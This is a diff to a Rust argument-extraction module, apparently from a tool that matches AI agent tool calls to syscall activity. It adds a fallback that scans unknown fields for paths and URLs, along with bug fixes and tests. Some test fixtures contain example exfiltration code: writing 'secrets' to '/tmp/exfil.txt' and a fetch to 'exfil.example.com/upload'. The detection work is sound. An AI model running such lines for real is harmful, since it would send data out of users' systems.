@@ -1,4 +1,4 @@
-// SPDX-License-Identifier: MIT
+// SPDX-License-Identifier: Apache-2.0 OR MIT
 //
 // args.rs — NormalizedArg extraction from Intent tool inputs and Action syscall args.
 //
@@ -64,7 +64,7 @@ pub fn extract_intent_args(_tool_name: &str, tool_input: &serde_json::Value) -> 
     if let Some(command) = tool_input
         .get("command")
         .and_then(|v| v.as_str())
-        .filter(|s| !s.is_empty())
+        .filter(|s| !s.trim().is_empty())
     {
         args.push(NormalizedArg::Command(extract_command_basename(command)));
         // Store full command text for content-based boundary detection
@@ -119,8 +119,92 @@ pub fn extract_intent_args(_tool_name: &str, tool_input: &serde_json::Value) -> 
         extract_paths_from_text(content, &mut args);
     }
 
+    // Generic fallback for field names this table does not know.
+    //
+    // The named rules above are Claude Code's field vocabulary. Another agent
+    // CLI uses different ones: OpenClaw's Code Mode passes JavaScript in
+    // `code`, which nothing above matches, so a real `exec` call produced an
+    // empty argument list and the correlator had nothing to match against —
+    // no argument match, no intent→action link. Rather than grow the list one
+    // agent at a time, scan the unrecognised fields for the same signals the
+    // named rules look for.
+    //
+    // Only *explicit* literals are taken (absolute / `~` / `./` paths and
+    // URLs), which is what `extract_paths_from_text` and
+    // `extract_urls_from_text` already select. That keeps precision: a
+    // relative word in a code string is not evidence of a filesystem target,
+    // but `/etc/shadow` inside one is.
+    if let Some(obj) = tool_input.as_object() {
+        for (key, value) in obj {
+            if KNOWN_ARG_FIELDS.contains(&key.as_str()) {
+                continue;
+            }
+            let Some(text) = value.as_str() else {
+                continue;
+            };
+            extract_explicit_literals_from_text(text, &mut args);
+        }
+    }
+
     args
 }
+
+/// Extract explicit filesystem paths and URLs from arbitrary text.
+///
+/// Splits on the characters that actually delimit a literal in code — quotes,
+/// backticks, brackets, `=`, `,`, `;` and whitespace — rather than on
+/// whitespace alone. That difference is what makes it work on another agent
+/// CLI's payloads: OpenClaw's `code` field holds JavaScript, so the target
+/// arrives as `fs.writeFileSync('/tmp/exfil.txt', …)` and a whitespace split
+/// yields the token `fs.writeFileSync('/tmp/exfil.txt'`, whose prefix is not a
+/// path.
+///
+/// Only *explicit* literals are taken (absolute / `~` / `./` paths and http(s)
+/// URLs). A bare identifier in code is not evidence of a filesystem target, and
+/// admitting one would make every intent match every action.
+///
+/// Never splits on `/` itself, so a path stays whole.
+fn extract_explicit_literals_from_text(text: &str, args: &mut Vec<NormalizedArg>) {
+    const DELIMITERS: &[char] = &[
+        ' ', '\t', '\n', '\r', '\'', '"', '`', '(', ')', '[', ']', '{', '}', ',', ';', '=', '<',
+        '>', '|', '&',
+    ];
+
+    for raw in text.split(|c: char| DELIMITERS.contains(&c)) {
+        let w = raw.trim();
+        if w.is_empty() {
+            continue;
+        }
+
+        if w.starts_with("http://") || w.starts_with("https://") {
+            if let Some(url) = parse_url(w) {
+                args.push(url);
+            }
+            continue;
+        }
+
+        if w.starts_with('/') || w.starts_with("./") || w.starts_with("~/") {
+            args.push(NormalizedArg::Path(normalize_intent_path(w)));
+        }
+    }
+}
+
+/// Field names handled explicitly above. Anything else is scanned by the
+/// generic fallback, so this list and the named rules must be kept in step.
+const KNOWN_ARG_FIELDS: &[&str] = &[
+    "file_path",
+    "notebook_path",
+    "path",
+    "pattern",
+    "command",
+    "url",
+    "query",
+    "description",
+    "prompt",
+    "old_string",
+    "new_string",
+    "content",
+];
 
 /// Extract normalized args from raw syscall arguments.
 pub fn extract_action_args(
@@ -134,9 +218,24 @@ pub fn extract_action_args(
         | ActionCandidateType::FileWrite
         | ActionCandidateType::FileOverwrite
         | ActionCandidateType::FileDelete => {
-            // First arg is the path
-            if let Some(path) = raw_args.first() {
+            // First arg is the path. An empty path is not a resource: pushing
+            // `Path("")` lets `compare_paths` treat it as a containment match
+            // against every other path (the empty string is a substring of
+            // everything), manufacturing evidence.
+            if let Some(path) = raw_args.first().filter(|path| !path.is_empty()) {
                 args.push(NormalizedArg::Path(normalize_action_path(path)));
+            }
+        }
+
+        ActionCandidateType::FileRename => {
+            // rename(old, new): both paths are resources. Dropping the
+            // destination would answer "what moved" but not "to where".
+            // Empty paths are skipped for the same reason as above.
+            if let Some(source) = raw_args.first().filter(|path| !path.is_empty()) {
+                args.push(NormalizedArg::Path(normalize_action_path(source)));
+            }
+            if let Some(destination) = raw_args.get(1).filter(|path| !path.is_empty()) {
+                args.push(NormalizedArg::Path(normalize_action_path(destination)));
             }
         }
 
@@ -254,9 +353,13 @@ fn extract_paths_from_command(command: &str, args: &mut Vec<NormalizedArg>) {
         if token.starts_with('/') || token.starts_with("./") || token.starts_with("~/") {
             args.push(NormalizedArg::Path(normalize_intent_path(token)));
         }
-        // Check for quoted paths within a single token
-        if (token.starts_with('"') && token.ends_with('"'))
-            || (token.starts_with('\'') && token.ends_with('\''))
+        // Check for quoted paths within a single token. A token that is a
+        // single quote character (`"` or `'`) satisfies both starts_with and
+        // ends_with; `[1..len - 1]` then panics with "byte range starts at 1
+        // but ends at 0". Require at least two bytes before stripping.
+        if token.len() >= 2
+            && ((token.starts_with('"') && token.ends_with('"'))
+                || (token.starts_with('\'') && token.ends_with('\'')))
         {
             let inner = &token[1..token.len() - 1];
             if inner.starts_with('/') || inner.starts_with("./") || inner.starts_with("~/") {
@@ -349,6 +452,16 @@ fn extract_paths_from_text(text: &str, args: &mut Vec<NormalizedArg>) {
 mod tests {
     use super::*;
 
+    /// A lone quote character used to panic with "byte range starts at 1 but
+    /// ends at 0" (seen in a live benchmark run).
+    #[test]
+    fn single_quote_token_does_not_panic() {
+        let mut args = Vec::new();
+        extract_paths_from_command("\"", &mut args);
+        extract_paths_from_command("'", &mut args);
+        extract_paths_from_command("''", &mut args);
+        assert!(args.is_empty());
+    }
     #[test]
     fn test_extract_intent_args_bash() {
         let input = serde_json::json!({"command": "ls -la /etc/hosts"});
@@ -605,6 +718,68 @@ mod tests {
         assert!(
             args.iter()
                 .any(|a| matches!(a, NormalizedArg::Path(p) if p == "/tmp"))
+        );
+    }
+
+    /// OpenClaw's Code Mode tool puts JavaScript in `code`. Before the generic
+    /// fallback no field name matched, so a real `exec` call yielded zero
+    /// arguments and the correlator could never link it to an action.
+    #[test]
+    fn test_extract_intent_args_unknown_field_carries_explicit_paths() {
+        let input = serde_json::json!({
+            "code": "const fs = require('fs'); fs.writeFileSync('/tmp/exfil.txt', secrets);"
+        });
+        let args = extract_intent_args("exec", &input);
+
+        assert!(
+            args.iter()
+                .any(|a| matches!(a, NormalizedArg::Path(p) if p == "/tmp/exfil.txt")),
+            "an explicit absolute path inside an unrecognised field must be extracted, got {args:?}"
+        );
+    }
+
+    #[test]
+    fn test_extract_intent_args_unknown_field_carries_urls() {
+        let input = serde_json::json!({"code": "fetch('https://exfil.example.com:8443/upload')"});
+        let args = extract_intent_args("exec", &input);
+
+        assert!(
+            args.iter()
+                .any(|a| matches!(a, NormalizedArg::Url { host, port }
+                    if host == "exfil.example.com" && *port == Some(8443))),
+            "an explicit URL inside an unrecognised field must be extracted, got {args:?}"
+        );
+    }
+
+    /// Precision guard: the fallback must not treat ordinary words in code as
+    /// filesystem targets, or every intent would match every action.
+    #[test]
+    fn test_extract_intent_args_unknown_field_ignores_bare_words() {
+        let input = serde_json::json!({
+            "code": "const total = items.reduce((a, b) => a + b, 0); return total;"
+        });
+        let args = extract_intent_args("exec", &input);
+
+        assert!(
+            args.is_empty(),
+            "no explicit path or URL means no argument, got {args:?}"
+        );
+    }
+
+    /// A field the named rules already handle must not be double-counted by
+    /// the fallback.
+    #[test]
+    fn test_extract_intent_args_known_field_is_not_scanned_twice() {
+        let input = serde_json::json!({"command": "cat /etc/hosts"});
+        let args = extract_intent_args("Bash", &input);
+
+        let hosts_count = args
+            .iter()
+            .filter(|a| matches!(a, NormalizedArg::Path(p) if p == "/etc/hosts"))
+            .count();
+        assert_eq!(
+            hosts_count, 1,
+            "expected exactly one occurrence, got {args:?}"
         );
     }
 }
